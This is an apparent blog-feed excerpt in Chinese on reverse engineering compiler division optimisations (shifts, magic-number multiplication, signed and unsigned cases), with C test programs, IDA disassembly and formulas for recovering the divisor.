src="https://math.now.sh?from=result%20%3D%20%5Cfrac%7B%5Cfrac%7Becx%20-%20%5Cfrac%7Becx%20%5Ctimes%20C%7D%7B2%5E%7B32%7D%7D%7D%7B2%7D%20%2B%20%5Cfrac%7Becx%20%5Ctimes%20C%7D%7B2%5E%7B32%7D%7D%7D%7B2%5E2%7D%0A" /></p><p>化简可得到：</p><p style=""><img src="https://math.now.sh?from=result%20%3D%20%5Cfrac%7B2%5E%7B32%7D%20%5Ctimes%20ecx%20%2B%20ecx%20%5Ctimes%20C%20%7D%7B2%5E%7B35%7D%7D%20%3D%20ecx%20%5Ctimes%20%5Cfrac%7B2%5E%7B32%7D%20%2B%20C%7D%7B2%5E%7B35%7D%7D%20%3D%20ecx%20%5Ctimes%20M%20%3E%3E%2035%0A" /></p><p>于是可以发现，其实就是编译器在计算<code>MagicNum</code>的时候，发现得到的结果用4个字节存放不下，多了一个进位出来，也就是<img src="https://math.now.sh?inline=2%5E%7B32%7D" style="display:inline-block;margin: 0;"/>​ 。所以在后序计算结果的时候，由于<code>MagicNum</code>是低4字节的结果，所以需要进行调整，在计算的时候需要先加上这个进位才能正确的得到结果。而它之所以拆分为上述情况，是因为要将除法转为周期更短的移位运算，进行了等价变换。</p><p>还原时需要将<code>MagicNum</code>加上<img src="https://math.now.sh?inline=2%5E%7B32%7D" style="display:inline-block;margin: 0;"/> 再进行还原即可。</p><h1>有符号数除以非2的幂的两种特殊情况</h1><p>出现这两种特殊情况的原因是，由于编译器在计算<code>MagicNum</code>的时候，是按照无符号数来进行运算的，但是在有符号数除法中需要使用有符号命令，此时得到的<code>MagicNum</code>可能会为负数，因此需要做调整；同理，其<code>MagicNum</code>本应该是负数，但是在计算过程中却被视为正数，因此也需要做调整，故有以下两种情况。</p><h2 id="除数是正数，但是MagicNum为负">除数是正数，但是<code>MagicNum</code>为负</h2><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">7</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 92492493h; MagicNum为负数，因为大于0x7fff, ffff</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 add     edx, ecx; 对比之前的有符号数除以非2的幂多了这个操作</span><br><span class="line">.text:0040100D                 sar     edx, 2</span><br><span class="line">.text:00401010                 mov     eax, edx</span><br><span class="line">.text:00401012                 shr     eax, 1Fh</span><br><span class="line">.text:00401015                 add     edx, eax</span><br><span class="line">.text:00401017                 push    edx</span><br><span class="line">.text:00401018                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101D                 call    printf</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:00401022                 add     esp, 8</span><br><span class="line">.text:00401025                 xor     eax, eax</span><br><span class="line">.text:00401027                 retn</span><br><span class="line">.text:00401027</span><br><span class="line">.text:00401027 _main           endp</span><br></pre></td></tr></table></figure><p>将上述操作所描写的数学公式写出来并化简，可以得到以下式子：</p><p style=""><img src="https://math.now.sh?from=result%20%3D%20%5Cfrac%7B%5Cfrac%7Becx%20%5Ctimes%20-C%7D%7B2%5E%7B32%7D%7D%20%2B%20ecx%7D%7B2%5E2%7D%20%3D%20%5Cfrac%7B-C%20%5Ctimes%20ecx%20%2B%202%5E%7B32%7D%20%5Ctimes%20ecx%7D%7B2%5E%7B34%7D%7D%3D%20ecx%20%5Ctimes%20%5Cfrac%7B2%5E%7B32%7D%20-%20C%7D%7B2%5E%7B34%7D%7D%20%3D%20ecx%20%5Ctimes%20M%20%3E%3E%2034%0A" /></p><p>其中<img src="https://math.now.sh?inline=M%20%3D%202%5E%7B32%7D%20-%20C" style="display:inline-block;margin: 0;"/>，即：<code>M</code>是对C取补之后的结果，真是的<code>MagicNum</code>应该为正值。</p><p>其多添加的这一句<code>add edx, ecx</code>其实就是对无符号整数乘以有符号数做调整，而还原方法是直接按照正数的方法进行还原即可。</p><h2 id="除数是负数，但是MagicNum为正">除数是负数，但是<code>MagicNum</code>为正</h2><p>测试代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">-7</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 6DB6DB6Dh; MagicNum为正数</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 sub     edx, ecx; 多出了一个减法操作</span><br><span class="line">.text:0040100D                 sar     edx, 2</span><br><span class="line">.text:00401010                 mov     eax, edx</span><br><span class="line">.text:00401012                 shr     eax, 1Fh</span><br><span class="line">.text:00401015                 add     edx, eax</span><br><span class="line">.text:00401017                 push    edx</span><br><span class="line">.text:00401018                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101D                 call    printf</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:00401022                 add     esp, 8</span><br><span class="line">.text:00401025                 xor     eax, eax</span><br><span class="line">.text:00401027                 retn</span><br><span class="line">.text:00401027</span><br><span class="line">.text:00401027 _main           endp</span><br></pre></td></tr></table></figure><p>同样，将上述运算写为数学表达式：</p><p style=""><img src="https://math.now.sh?from=result%20%3D%20%5Cfrac%7B%5Cfrac%7Becx%20%5Ctimes%20C%7D%7B2%5E%7B32%7D%7D%20-%20ecx%7D%7B2%5E2%7D%20%3D%20%5Cfrac%7Becx%20%5Ctimes%20C%20-%202%5E%7B32%7D%20%5Ctimes%20ecx%7D%7B2%5E%7B34%7D%7D%20%3D%20ecx%20%5Ctimes%20%5Cfrac%7BC%20-%202%5E%7B32%7D%7D%7B2%5E%7B34%7D%7D%20%3D%20ecx%20%5Ctimes%20M%20%3E%3E%2034%0A" /></p><p>其中<img src="https://math.now.sh?inline=M%20%3D%20-2%5E%7B32%7D%20%2B%20C" style="display:inline-block;margin: 0;"/>，即：真正的<code>M</code>是一个负值。</p><p>其还原方法还是先求补，再还原。</p><h1>整体总结</h1><p>总结一下识别方法：</p><ol><li>在识别时，先观察是否有加1做调整的操作，如果有且运算指令使用的是有符号运算指令，则被除数是有符号数。</li><li>查看<code>MagicNum</code>是否是负数（大于等于<code>0x8000,0000</code>即为负数）。如果是负数，且未见加调整，则除数是负数；如果是正数，且有减调整，则除数是负数，需要先求补再进行还原；同理，如果是负数，且有加调整，除数是正数；如果是正数，且未有减调整，则除数是正数</li></ol><p>对于还原方法，首先判断除数是正数还是负数来进行还原：</p><ol><li>正数还原除数</li></ol><p style=""><img src="https://math.now.sh?from=%5Cfrac%7B2%5En%7D%7BM%7D%0A" /></p><ol start="2"><li>负数还原除数</li></ol><p style=""><img src="https://math.now.sh?from=%5Cfrac%7B2%5En%7D%7B2%5E%7B32%7D%20-%20M%7D%0A" /></p><ol start="3"><li>溢出还原除数</li></ol><p style=""><img src="https://math.now.sh?from=%5Cfrac%7B2%5En%7D%7B2%5E%7B32%7D%20%2B%20M%7D%0A" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;大纲&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;无符号数除以非2的幂的特殊情况&lt;/li&gt;
&lt;li&gt;有符号数除以非2的幂的两种特殊情况
&lt;ul&gt;
&lt;li&gt;除数是正数，但是&lt;code&gt;MagicNum&lt;/code&gt;为负&lt;/li&gt;
&lt;li&gt;除数是负数，但是&lt;code&gt;MagicNum&lt;/co</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="除法优化" scheme="https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>C++逆向：C/C++除法的常规优化及其识别与还原</title>
    <link href="https://4st.tech/2021/08/03/c-c-chu-fa-de-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/03/c-c-chu-fa-de-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/</id>
    <published>2021-08-03T03:58:36.000Z</published>
    <updated>2021-09-01T05:12:13.883Z</updated>
    
    <content type="html"><![CDATA[<h1>大纲</h1><p>本文涉及到的是除法的一般优化方法，其中特殊情况暂时不列举，涉及的知识点有：</p><ul><li>被除数是无符号数，除以2的幂</li><li>被除数是有符号数，除以2的幂</li><li>被除数是无符号数，除以非2的幂</li><li>被除数是有符号数，除以非2的幂的常规情况，即：<code>MagicNum</code>没有进位和不为负数的情况</li></ul><p>在学习的时候，需要对照着看，使用的工具是<code>VC6.0</code>和<code>IDA 6.1</code>。使用的是<code>VC6.0</code>的原因是其编译器对于除法优化更加激进一些，也更加不好识别一些，而<code>VS2019</code>等<code>IDE</code>的<code>MSVC</code>编译器已经将部分优化直接替换为了除法等指令，原因可能是因为现在的硬件对于除法指令的硬件优化更加好一些，已经在可接受范围内了，所以本文采用的是<code>VC6.0</code>的编译器进行练习。</p><p>需要注意的是</p><ol><li>在编译时需要选择的是<code>Release</code>版本，而不能是<code>Debug</code>版本，开启的选项是速度优先优化选项，而不是体积优先。</li><li>在写例子的时候，需要注意传播优化、折叠优化等优化方式带来的影响</li></ol><h1>无符号数除以2的幂</h1><h2 id="示例01-除数为2">示例01 - 除数为2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对其反汇编进行整理，得到反汇编为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">_main proc near</span><br><span class="line"></span><br><span class="line">arg_0= dword ptr  4</span><br><span class="line"></span><br><span class="line">mov     eax, [esp+arg_0]</span><br><span class="line">shr     eax, 1</span><br><span class="line">push    eax</span><br><span class="line">push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">call    printf</span><br><span class="line">add     esp, 8</span><br><span class="line">xor     eax, eax</span><br><span class="line">retn</span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure><p>发现其使用的是<code>shr reg, 1</code> ，使用无符号右移指令来替代除法指令，其指令周期更短，运算更快。</p><h2 id="示例02-除数为2的幂">示例02 - 除数为2的幂</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 shr     eax, 3   ; 还是使用的是无符号右移指令</span><br><span class="line">.text:00401007                 push    eax</span><br><span class="line">.text:00401008                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040100D                 call    printf</span><br><span class="line">.text:0040100D</span><br><span class="line">.text:00401012                 add     esp, 8</span><br><span class="line">.text:00401015                 xor     eax, eax</span><br><span class="line">.text:00401017                 retn</span><br><span class="line">.text:0040</span><br></pre></td></tr></table></figure><p>可以发现，其使用的还是无符号右移指令，右移的次数为幂次</p><h2 id="总结">总结</h2><p>对于被除数是无符号数，而除数是2的幂的情况下，<code>MSVC</code>使用的是无符号右移指令，定式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov reg, x; x为被除数</span><br><span class="line">shr reg, N; N为2的幂次</span><br></pre></td></tr></table></figure><p>还原时直接可以通过<img src="https://math.now.sh?inline=2%5EN" style="display:inline-block;margin: 0;"/>得到除数</p><h1>有符号数除以2的幂</h1><h2 id="示例01-除数为2-2">示例01 - 除数为2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察其反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  .text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 sub     eax, edx</span><br><span class="line">.text:00401007                 sar     eax, 1</span><br><span class="line">.text:00401009                 push    eax</span><br><span class="line">.text:0040100A                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040100F                 call    printf</span><br><span class="line">.text:0040100F</span><br><span class="line">.text:00401014                 add     esp, 8</span><br><span class="line">.text:00401017                 xor     eax, eax</span><br><span class="line">.text:00401019                 retn</span><br><span class="line">.text:00401019</span><br><span class="line">.text:00401019 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现其计算方法并不是简单的将无符号右移指令<code>shr</code> 变为<code>sar</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 sub     eax, edx</span><br><span class="line">.text:00401007                 sar     eax, 1</span><br></pre></td></tr></table></figure><p>它在做什么呢？需要一行一行看。首先它将<code>eax</code>进行符号扩展，变为<code>edx, eax</code>的形式，<code>edx</code>保存的是有符号数<code>arg0</code> 的符号位。如果<code>arg0</code>为正数，则<code>edx</code>的值为0；如果<code>arg0</code>为负数，则<code>edx</code>的值为<code>0xFFFF,FFFF</code>，也就是<code>-1</code>。紧接着它用了减法操作，如果上述运算结果<code>edx</code>为0，则相当于该操作是无效操作；如果是<code>-1</code>，则相当于将被除数做了一个加一的操作。最后才做了一个带符号的右移运算，得到最终的除法运算结果。</p><p>将运算的每一步都搞清楚了好像也没明白它为什么这么做？他其实是将分支操作给转变成了无分支的操作了。在<code>C/C++</code>中，它的取整操作是向0取整的，也就是说，对于正数，它是向下取整；而对于负数，它是向上取整的。举个例子，<code>3.5</code>取整是3，<code>-3.5</code>取整就是<code>-3</code>，即：取更靠近0的整数。在这里就出现问题了，对于数学意义上来讲，<code>-3.5</code>的取整应该是<code>-4</code>，所以为了符合<code>C/C++</code>的向0取整约定，需要做调整，那么如何做调整呢，只需要将负数部分的向下取整变为上整即可，也就是说：<code>-3.5 + 1 = -2.5</code>，然后再取下整，就是<code>-3</code>。与向0取整的结果是一致的。</p><p>在上述描述的下整转上整其实有一个数学定理，本文并不打算将所用到的定理一一列出，而是举例子和描述出最终结果，以将笔者所理解的描述出来，证明我自己已经懂了即可。</p><h2 id="示例02-除数为2的幂-2">示例02 - 除数为2的幂</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 and     edx, 7   ; 在上述基础上又多出了这么一个操作</span><br><span class="line">.text:00401008                 add     eax, edx</span><br><span class="line">.text:0040100A                 sar     eax, 3</span><br><span class="line">.text:0040100D                 push    eax</span><br><span class="line">.text:0040100E                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:00401013                 call    printf</span><br><span class="line">.text:00401013</span><br><span class="line">.text:00401018                 add     esp, 8</span><br><span class="line">.text:0040101B                 xor     eax, eax</span><br><span class="line">.text:0040101D                 retn</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:0040101D _main           endp</span><br></pre></td></tr></table></figure><p>根据示例01的分析，这个也应该是有分支转为无分支的操作（因为分支操作打乱了流水线优化，所以速度会变慢）。但是其又多了一句<code>and edx, 7</code>的运算，这句运算是做什么用的呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 and     edx, 7   ; 在上述基础上又多出了这么一个操作</span><br><span class="line">.text:00401008                 add     eax, edx   ; 加一操作也变为了加0或者加7了</span><br><span class="line">.text:0040100A                 sar     eax, 3</span><br></pre></td></tr></table></figure><p>设<code>a</code>是被除数，<code>b</code>是除数，<code>q</code>是商，<code>r</code>是余数，则有：<img src="https://math.now.sh?inline=a%20%3D%20qb%20%2B%20r" style="display:inline-block;margin: 0;"/>，可以得到：<img src="https://math.now.sh?inline=%5Cfrac%7Ba%7D%7Bb%7D%20%3D%20q%20%2B%20%5Cfrac%7Br%7D%7Bb%7D" style="display:inline-block;margin: 0;"/> ，当<img src="https://math.now.sh?inline=a%20%3C%200%2C%20b%20%3E%200" style="display:inline-block;margin: 0;"/>时，有：<img src="https://math.now.sh?inline=%5Clceil%20%5Cfrac%7Ba%7D%7Bb%7D%20%5Crceil%3D%20%5Clceil%20q%20%2B%20%5Cfrac%7Br%7D%7Bb%7D%5Crceil" style="display:inline-block;margin: 0;"/>，而<img src="https://math.now.sh?inline=%5Clceil%20q%20%2B%20%5Cfrac%7Br%7D%7Bb%7D%5Crceil%20%3D%20q%20%2B%20%5Clceil%20%5Cfrac%7Br%7D%7Bb%7D%20%5Crceil" style="display:inline-block;margin: 0;"/> ，且$ |r| &lt; b$ , <img src="https://math.now.sh?inline=%7Cr%7C%20%2B%201%20%5Cle%20b" style="display:inline-block;margin: 0;"/>，故有：</p><p style=""><img src="https://math.now.sh?from=%5Clceil%20%5Cfrac%7Ba%7D%7Bb%7D%20%5Crceil%20-%20%5Clfloor%20%5Cfrac%7Ba%20%2B%20b%20-%201%7D%7Bb%7D%20%5Crfloor%20%3D%20q%20%2B%20%5Clceil%20%5Cfrac%7Br%7D%7Bb%7D%20%5Crceil%20-%20q%20-%20%5Clfloor%20%5Cfrac%7Br%20%2B%20b%20-%201%7D%7Bb%7D%20%5Crfloor%20%3D%20%5Clceil%20%5Cfrac%7Br%7D%7Bb%7D%20%5Crceil%20-%20%5Clfloor%20%5Cfrac%7Br%20-%201%7D%7Bb%7D%20%5Crfloor%20-1%0A" /></p><p style=""><img src="https://math.now.sh?from=%5Clceil%20%5Cfrac%7Br%7D%7Bb%7D%20%5Crceil%20-%20%5Clfloor%20%5Cfrac%7Br%20-%201%7D%7Bb%7D%20%5Crfloor%20%3D%201%2Cwhen%20%5Cspace%20r%20%3C%200%0A" /></p><p style=""><img src="https://math.now.sh?from=%20%5Clceil%20%5Cfrac%7Br%7D%7Bb%7D%20%5Crceil%20-%20%5Clfloor%20%5Cfrac%7Br%20-%201%7D%7Bb%7D%20%5Crfloor%20%3D%201%2Cwhen%20%5Cspace%20r%20%3D%200%0A" /></p><p style=""><img src="https://math.now.sh?from=%20%5Clceil%20%5Cfrac%7Br%7D%7Bb%7D%20%5Crceil%20-%20%5Clfloor%20%5Cfrac%7Br%20-%201%7D%7Bb%7D%20%5Crfloor%20%3D%201%2Cwhen%20%5Cspace%20r%20%3E%200%0A" /></p><p style=""><img src="https://math.now.sh?from=%20%5CRightarrow%20%5Clceil%20%5Cfrac%7Ba%7D%7Bb%7D%20%5Crceil%20%3D%20%5Clfloor%20%5Cfrac%7Ba%20%2B%20b%20-%201%7D%7Bb%7D%20%5Crfloor%0A" /></p><p>对于上述证明的通俗理解是：由于<code>r</code>是余数，其结果可能不为0，那么使其上整转为下整运算，分子需要加的最大整数就应该是<code>b - 1</code>，因为再加1，就变为了1，则当余数为0时，会影响其结果，导致计算后结果上整值和下整值不正确，因此为了保证其结果不管在什么时候都能相等，调整因子最大为<code>b - 1</code></p><h2 id="总结-2">总结</h2><p>对于这种的代码定式可以统一为示例02的定式，原因是示例1的为示例2的特殊情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov reg, x</span><br><span class="line">cdq</span><br><span class="line">and edx, 2^N - 1</span><br><span class="line">add reg, edx</span><br><span class="line">sar reg, N</span><br></pre></td></tr></table></figure><p>识别时需要先统计一共右移了几次，然后再判断其用来做与运算的值是否是<img src="https://math.now.sh?inline=2%5EN%20-%201" style="display:inline-block;margin: 0;"/>​，如果是，则可以认为是被除数为有符号数而除数是2的幂的情况，还原时直接将除数还原为<img src="https://math.now.sh?inline=2%5EN" style="display:inline-block;margin: 0;"/>​</p><p>当除数是负的2的幂的时候，只需要在最后面添加一句<code>neg reg</code>即可得到结果。</p><h1>无符号数除以非2的幂</h1><h2 id="示例">示例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, 0CCCCCCCDh; 多出来一个大数</span><br><span class="line">.text:00401005                 mul     [esp+arg_0]</span><br><span class="line">.text:00401009                 shr     edx, 2</span><br><span class="line">.text:0040100C                 push    edx; 乘法运算后取高32位</span><br><span class="line">.text:0040100D                 push    offset s-&gt;D     ; 